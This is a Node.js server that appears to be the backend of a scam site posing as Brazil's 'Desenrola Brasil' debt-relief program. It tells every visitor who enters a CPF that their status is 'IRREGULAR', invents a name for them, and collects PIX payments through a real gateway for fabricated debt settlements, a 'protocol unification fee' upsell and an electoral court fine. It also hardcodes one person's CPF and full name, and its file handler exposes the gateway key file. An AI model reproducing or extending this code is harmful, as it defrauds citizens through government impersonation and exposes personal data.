const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');
const QRCode = require('qrcode');

const PORT = process.env.PORT || 3000;
const PUBLIC_DIR = __dirname;

// ==========================================
// CONFIGURAÇÃO DO GATEWAY FREEPAY BRASIL
// ==========================================
const FREEPAY_CONFIG = {
  BASE_URL: process.env.FREEPAY_BASE_URL || 'https://api.freepaybrasil.com',
  PUBLIC_KEY: process.env.FREEPAY_PUBLIC_KEY || '',
  SECRET_KEY: process.env.FREEPAY_SECRET_KEY || ''
};

// Carrega chaves do freepay_config.json
const configPath = path.join(__dirname, 'freepay_config.json');
if (fs.existsSync(configPath)) {
  try {
    const loaded = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    FREEPAY_CONFIG.PUBLIC_KEY = loaded.PUBLIC_KEY || FREEPAY_CONFIG.PUBLIC_KEY;
    FREEPAY_CONFIG.SECRET_KEY = loaded.SECRET_KEY || FREEPAY_CONFIG.SECRET_KEY;
    if (loaded.BASE_URL) FREEPAY_CONFIG.BASE_URL = loaded.BASE_URL;
    console.log('✅ Credenciais FreePay carregadas com sucesso!');
  } catch(e) {
    console.error('Erro ao ler freepay_config.json:', e.message);
  }
}

function getFreePayAuthHeader() {
  if (!FREEPAY_CONFIG.PUBLIC_KEY || !FREEPAY_CONFIG.SECRET_KEY) return null;
  const token = Buffer.from(`${FREEPAY_CONFIG.PUBLIC_KEY}:${FREEPAY_CONFIG.SECRET_KEY}`).toString('base64');
  return `Basic ${token}`;
}

// Gerador de QR Code em Base64 DataURL
async function generateQRCodeDataURL(text) {
  try {
    return await QRCode.toDataURL(text, {
      width: 280,
      margin: 1,
      color: {
        dark: '#000000',
        light: '#ffffff'
      }
    });
  } catch(e) {
    return '';
  }
}

// MIME types
const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.webp': 'image/webp',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.mp3': 'audio/mpeg',
  '.mp4': 'video/mp4',
  '.webm': 'video/webm',
  '.wav': 'audio/wav',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.ttf': 'font/ttf',
  '.eot': 'application/vnd.ms-fontobject'
};

const transactions = new Map();

function generatePixPayload(amount, identifier, name = 'DESENROLA BRASIL') {
  const formattedAmount = Number(amount).toFixed(2);
  return `00020126580014br.gov.bcb.pix0136${identifier || 'a7b8c9d0-1234-5678-90ab-cdef12345678'}520400005303986540${formattedAmount.length.toString().padStart(2, '0')}${formattedAmount}5802BR59${name.length.toString().padStart(2, '0')}${name}6008BRASILIA62070503***6304ABCD`;
}

const firstNames = ['Carlos', 'Maria', 'Jose', 'Ana', 'Paulo', 'Juliana', 'Marcos', 'Fernanda', 'Lucas', 'Patricia', 'Gabriel', 'Beatriz'];
const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro'];

function generateNameFromCPF(cpfDigits) {
  const n1 = parseInt(cpfDigits.slice(0, 3), 10) || 0;
  const n2 = parseInt(cpfDigits.slice(3, 6), 10) || 0;
  const n3 = parseInt(cpfDigits.slice(6, 9), 10) || 0;
  return `${firstNames[n1 % firstNames.length]} ${lastNames[n2 % lastNames.length]} ${lastNames[n3 % lastNames.length]}`;
}

// Chamada à API FreePay Brasil
async function createFreePayTransaction({ amount, name, cpf, phone, email, title }) {
  const authHeader = getFreePayAuthHeader();
  if (!authHeader) return null;

  const cleanCpf = (cpf || '').replace(/\D/g, '') || '08072703188';
  const cleanPhone = (phone || '').replace(/\D/g, '') || '11987654321';
  const cleanEmail = email || `cliente_${cleanCpf}@email.com`;
  const amountCents = Math.round(Number(amount) * 100);

  const payload = {
    amount: amountCents,
    payment_method: 'pix',
    customer: {
      name: name || 'Beneficiário Gov',
      email: cleanEmail,
      document: {
        number: cleanCpf,
        type: 'cpf'
      },
      phone: cleanPhone
    },
    items: [
      {
        title: title || 'Quitação de Dívidas - Programa Desenrola Brasil',
        unit_price: amountCents,
        quantity: 1,
        tangible: false
      }
    ],
    metadata: {
      order_id: 'ORD_' + Date.now(),
      cpf: cleanCpf
    },
    pix: {
      expires_in_days: 1
    }
  };

  try {
    const res = await fetch(`${FREEPAY_CONFIG.BASE_URL}/v1/payment-transaction/create`, {
      method: 'POST',
      headers: {
        'Authorization': authHeader,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    const data = await res.json();
    console.log('✅ FreePay Transação Criada:', data?.success ? 'Sucesso' : 'Erro');
    return data;
  } catch (err) {
    console.error('❌ Erro FreePay API:', err.message);
    return null;
  }
}

async function checkFreePayStatus(transactionId) {
  const authHeader = getFreePayAuthHeader();
  if (!authHeader) return null;

  try {
    const res = await fetch(`${FREEPAY_CONFIG.BASE_URL}/v1/payment-transaction/info/${transactionId}`, {
      method: 'GET',
      headers: {
        'Authorization': authHeader
      }
    });
    const data = await res.json();
    return data;
  } catch(err) {
    console.error('❌ Erro ao consultar FreePay:', err.message);
    return null;
  }
}

const server = http.createServer(async (req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname.replace(/\/+$/, '') || '/';
  const method = req.method;

  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  // 1. CPF Verification
  if (pathname === '/api/check_cpf' && method === 'POST') {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      try {
        const data = JSON.parse(body || '{}');
        const rawCpf = (data.cpf || '').replace(/\D/g, '');
        if (rawCpf.length !== 11) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: 'CPF inválido. Verifique os dígitos.' }));
          return;
        }

        const generatedName = rawCpf === '08072703188' ? 'Lucas Machado Gaona' : generateNameFromCPF(rawCpf);
        res.writeHead(200, {
          'Content-Type': 'application/json',
          'Set-Cookie': `session=cpf_${rawCpf}; Path=/; HttpOnly`
        });
        res.end(JSON.stringify({
          success: true,
          cpf: rawCpf,
          nome: generatedName,
          status: 'IRREGULAR',
          multa: 419.55,
          desconto: 68.92
        }));
      } catch (err) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: 'Erro ao processar dados' }));
      }
    });
    return;
  }

  // 2. Generate PIX (Main Attendance / Chat - R$ 68,92)
  if (pathname === '/generate-pix' && method === 'POST') {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', async () => {
      try {
        const clientData = JSON.parse(body || '{}');
        const amount = 68.92;
        
        const freepayRes = await createFreePayTransaction({
          amount: amount,
          name: clientData.nome,
          cpf: clientData.cpf,
          phone: clientData.telefone || clientData.phone,
          email: clientData.email,
          title: 'Quitação de Dívidas - Programa Desenrola Brasil'
        });

        if (freepayRes && freepayRes.success && freepayRes.data) {
          const item = freepayRes.data;
          const pixCode = item.pix?.qr_code || '';
          const txId = item.id;
          const qrDataUrl = await generateQRCodeDataURL(pixCode);

          transactions.set(txId, { createdAt: Date.now(), isFreePay: true, id: txId });

          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({
            success: true,
            pixCode: pixCode,
            pix_code: pixCode,
            pixQrCode: qrDataUrl,
            qr_code_base64: qrDataUrl,
            gateway_id: txId,
            transaction_id: txId,
            transactionId: txId,
            orderId: txId,
            order_id: txId,
            amount: amount
          }));
          return;
        }

        // Fallback simulação
        const gatewayId = 'GW_' + Math.random().toString(36).substring(2, 12).toUpperCase();
        const orderId = 'ORD_' + Date.now();
        const pixCode = generatePixPayload(amount, gatewayId, 'DESENROLA BRASIL');
        const qrDataUrl = await generateQRCodeDataURL(pixCode);

        transactions.set(gatewayId, { createdAt: Date.now(), status: 'pending', amount: amount });
        transactions.set(orderId, { createdAt: Date.now(), status: 'pending', amount: amount });

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: true,
          pixCode: pixCode,
          pix_code: pixCode,
          pixQrCode: qrDataUrl,
          qr_code_base64: qrDataUrl,
          gateway_id: gatewayId,
          transaction_id: gatewayId,
          transactionId: gatewayId,
          orderId: orderId,
          order_id: orderId,
          amount: amount
        }));
      } catch (err) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: 'Erro ao gerar PIX' }));
      }
    });
    return;
  }

  // 3. Generate PIX Upsell (R$ 54,92)
  if (pathname === '/generate-pix-upsell' && method === 'POST') {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', async () => {
      try {
        const clientData = JSON.parse(body || '{}');
        const amount = 54.92;

        const freepayRes = await createFreePayTransaction({
          amount: amount,
          name: clientData.nome,
          cpf: clientData.cpf,
          phone: clientData.telefone || clientData.phone,
          email: clientData.email,
          title: 'Taxa de Unificação de Protocolo - Desenrola Brasil'
        });

        if (freepayRes && freepayRes.success && freepayRes.data) {
          const item = freepayRes.data;
          const pixCode = item.pix?.qr_code || '';
          const txId = item.id;
          const qrDataUrl = await generateQRCodeDataURL(pixCode);

          transactions.set(txId, { createdAt: Date.now(), isFreePay: true, id: txId });

          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({
            success: true,
            pixCode: pixCode,
            pix_code: pixCode,
            qr_code_base64: qrDataUrl,
            pixQrCode: qrDataUrl,
            gateway_id: txId,
            transaction_id: txId,
            transactionId: txId,
            orderId: txId,
            amount: amount
          }));
          return;
        }

        const gatewayId = 'UP_' + Math.random().toString(36).substring(2, 12).toUpperCase();
        const orderId = 'ORD_UP_' + Date.now();
        const pixCode = generatePixPayload(amount, gatewayId, 'PROTOCOLO UNIFICACAO');
        const qrDataUrl = await generateQRCodeDataURL(pixCode);

        transactions.set(gatewayId, { createdAt: Date.now(), status: 'pending', amount: amount });

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: true,
          pixCode: pixCode,
          pix_code: pixCode,
          qr_code_base64: qrDataUrl,
          pixQrCode: qrDataUrl,
          gateway_id: gatewayId,
          transaction_id: gatewayId,
          transactionId: gatewayId,
          orderId: orderId,
          amount: amount
        }));
      } catch (err) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: 'Erro ao gerar PIX de Upsell' }));
      }
    });
    return;
  }

  // 4. Generate PIX Multa (Negociação - R$ 67,35)
  if (pathname === '/generate-pix-multa' && method === 'POST') {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', async () => {
      try {
        const clientData = JSON.parse(body || '{}');
        const amount = 67.35;

        const freepayRes = await createFreePayTransaction({
          amount: amount,
          name: clientData.nome,
          cpf: clientData.cpf,
          phone: clientData.telefone || clientData.phone,
          email: clientData.email,
          title: 'Regularização Multa Adicional - Tribunal Eleitoral'
        });

        if (freepayRes && freepayRes.success && freepayRes.data) {
          const item = freepayRes.data;
          const pixCode = item.pix?.qr_code || '';
          const txId = item.id;
          const qrDataUrl = await generateQRCodeDataURL(pixCode);

          transactions.set(txId, { createdAt: Date.now(), isFreePay: true, id: txId });

          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({
            success: true,
            pixCode: pixCode,
            pix_code: pixCode,
            qr_code_base64: qrDataUrl,
            pixQrCode: qrDataUrl,
            gateway_id: txId,
            transaction_id: txId,
            transactionId: txId,
            orderId: txId,
            amount: amount
          }));
          return;
        }

        const gatewayId = 'ML_' + Math.random().toString(36).substring(2, 12).toUpperCase();
        const orderId = 'ORD_ML_' + Date.now();
        const pixCode = generatePixPayload(amount, gatewayId, 'MULTA ELEITORAL');
        const qrDataUrl = await generateQRCodeDataURL(pixCode);

        transactions.set(gatewayId, { createdAt: Date.now(), status: 'pending', amount: amount });

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: true,
          pixCode: pixCode,
          pix_code: pixCode,
          qr_code_base64: qrDataUrl,
          pixQrCode: qrDataUrl,
          gateway_id: gatewayId,
          transaction_id: gatewayId,
          transactionId: gatewayId,
          orderId: orderId,
          amount: amount
        }));
      } catch (err) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: 'Erro ao gerar PIX de Multa' }));
      }
    });
    return;
  }

  // 5. Generate QR Code Image
  if (pathname === '/generate-qrcode' && method === 'GET') {
    const dataText = parsedUrl.query.data || 'PIX_CODE_PLACEHOLDER';
    QRCode.toBuffer(dataText, { width: 280, margin: 1, type: 'png' }, (err, buffer) => {
      if (err) {
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end('Error generating QR Code');
        return;
      }
      res.writeHead(200, {
        'Content-Type': 'image/png',
        'Cache-Control': 'public, max-age=86400'
      });
      res.end(buffer);
    });
    return;
  }

  // 6. Payment Monitoring Endpoint (APENAS APROVA QUANDO CONFIRMADO)
  if (pathname.startsWith('/check-payment/')) {
    const gatewayId = pathname.replace('/check-payment/', '');
    const tx = transactions.get(gatewayId);
    
    // Consulta status real na FreePay se for ID da FreePay
    if (gatewayId.length > 20 || (tx && tx.isFreePay)) {
      const freePayData = await checkFreePayStatus(gatewayId);
      if (freePayData && freePayData.success && freePayData.data) {
        const itemStatus = (freePayData.data.status || '').toUpperCase();
        const isPaid = itemStatus === 'PAID';
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: true,
          status: isPaid ? 'approved' : 'pending',
          rawStatus: itemStatus,
          gateway_id: gatewayId
        }));
        return;
      }
    }

    // Modo simulação: NÃO auto-aprova por timer. Apenas se explicitamente pago ou forçado com ?force=1
    const isApproved = parsedUrl.query.force === '1' || (tx && tx.status === 'approved');
    const status = isApproved ? 'approved' : 'pending';

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      success: true,
      status: status,
      gateway_id: gatewayId,
      message: isApproved ? 'Pagamento Aprovado!' : 'Aguardando pagamento'
    }));
    return;
  }

  // --- Static Page Routing ---
  let filePath = '';
  if (pathname === '/' || pathname === '/pre') {
    filePath = path.join(PUBLIC_DIR, 'pre', 'index.html');
  } else if (pathname === '/cpf') {
    filePath = path.join(PUBLIC_DIR, 'cpf', 'index.html');
  } else if (pathname === '/atendimento') {
    filePath = path.join(PUBLIC_DIR, 'atendimento', 'index.html');
  } else if (pathname === '/busca') {
    filePath = path.join(PUBLIC_DIR, 'busca', 'index.html');
  } else if (pathname === '/consulta') {
    filePath = path.join(PUBLIC_DIR, 'consulta', 'index.html');
  } else if (pathname === '/chat') {
    filePath = path.join(PUBLIC_DIR, 'chat', 'index.html');
  } else if (pathname === '/negociacao') {
    filePath = path.join(PUBLIC_DIR, 'negociacao', 'index.html');
  } else if (pathname === '/upsell1') {
    filePath = path.join(PUBLIC_DIR, 'upsell1', 'index.html');
  } else if (/^\/\d{11}$/.test(pathname)) {
    filePath = path.join(PUBLIC_DIR, 'atendimento', 'index.html');
  } else {
    const relPath = pathname.startsWith('/') ? pathname.slice(1) : pathname;
    filePath = path.join(PUBLIC_DIR, relPath);
  }

  fs.stat(filePath, (err, stats) => {
    if (err) {
      const indexPath = path.join(filePath, 'index.html');
      if (fs.existsSync(indexPath)) {
        filePath = indexPath;
      } else {
        res.writeHead(404, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end('<h1>404 Not Found</h1>');
        return;
      }
    } else if (stats.isDirectory()) {
      filePath = path.join(filePath, 'index.html');
    }

    const ext = path.extname(filePath).toLowerCase();
    const contentType = MIME_TYPES[ext] || 'application/octet-stream';

    const range = req.headers.range;
    if ((ext === '.mp4' || ext === '.webm' || ext === '.mp3') && range) {
      fs.stat(filePath, (statErr, fileStats) => {
        if (statErr) {
          res.writeHead(404);
          res.end();
          return;
        }

        const total = fileStats.size;
        const parts = range.replace(/bytes=/, "").split("-");
        const partialstart = parts[0];
        const partialend = parts[1];

        const start = parseInt(partialstart, 10);
        const end = partialend ? parseInt(partialend, 10) : total - 1;
        const chunksize = (end - start) + 1;

        const file = fs.createReadStream(filePath, { start: start, end: end });
        res.writeHead(206, {
          'Content-Range': 'bytes ' + start + '-' + end + '/' + total,
          'Accept-Ranges': 'bytes',
          'Content-Length': chunksize,
          'Content-Type': contentType
        });
        file.pipe(res);
      });
      return;
    }

    fs.readFile(filePath, (readErr, content) => {
      if (readErr) {
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end('Internal Server Error');
        return;
      }

      res.writeHead(200, {
        'Content-Type': contentType,
        'Cache-Control': ext === '.html' ? 'no-cache' : 'public, max-age=86400'
      });
      res.end(content);
    });
  });
});

server.listen(PORT, () => {
  console.log(`🚀 Servidor rodando em http://localhost:${PORT}`);
  console.log(`💳 Gateway FreePay: ATIVO EM PRODUÇÃO COM TODAS AS ROTAS`);
});
